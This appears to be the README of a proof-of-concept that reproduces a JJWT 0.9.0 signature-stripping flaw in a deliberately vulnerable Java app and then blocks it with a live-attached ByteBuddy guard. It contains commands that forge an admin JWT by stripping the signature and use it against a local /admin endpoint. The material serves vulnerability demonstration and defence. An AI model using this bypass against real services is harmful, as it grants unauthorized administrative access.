# JJWT 0.9.0 signature-stripping PoC

This deliberately vulnerable HTTP application demonstrates CGP-xpq5-jm7p-884r.
It resolves JJWT 0.9.0 from Maven Central, issues a signed user JWT, and protects an
`/admin` endpoint with the vulnerable generic `JwtParser.parse(String)` API.

## 1. Build the image

Run from `poc-CGP-xpq5-jm7p-884r`:

```bash
docker build -t cgp-jjwt-poc -f vulnerable-jwt-app/Dockerfile .
```

## 2. Reproduce the bypass without the agent

Start the vulnerable application:

```bash
docker run --rm --name cgp-jjwt-poc -p 8080:8080 cgp-jjwt-poc
```

In another terminal, obtain a legitimate user token and confirm that it cannot
access the admin endpoint:

```bash
TOKEN=$(curl -fsS http://127.0.0.1:8080/token)
curl -i -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8080/admin
```

Expected result: `HTTP/1.1 403 Forbidden` and `REJECTED: role=user`.

Forge an admin token by changing the payload and stripping the signature:

```bash
FORGED=$(docker run --rm cgp-jjwt-poc forge "$TOKEN")
curl -i -H "Authorization: Bearer $FORGED" http://127.0.0.1:8080/admin
```

Expected vulnerable result: `HTTP/1.1 200 OK` and
`ACCEPTED: admin access granted to mallory`.

## 3. Attach the protection without restarting the application

Attach the guard to the already-running application. The Java application is
PID 1 because the image uses an exec-form entrypoint:

```bash
docker exec cgp-jjwt-poc \
  java -jar /app/jjwt-bytebuddy-guard.jar 1
```

No container or application restart is needed. Send the same forged token again:

```bash
curl -i -H "Authorization: Bearer $FORGED" http://127.0.0.1:8080/admin
```

Expected protected result: `HTTP/1.1 401 Unauthorized` and
`REJECTED by SECURITY EXCEPTION: Rejected JWT with an empty signature segment.`

The agent uses retransformation, so it instruments the already-loaded
`io.jsonwebtoken.impl.DefaultJwtParser` class in the live JVM.
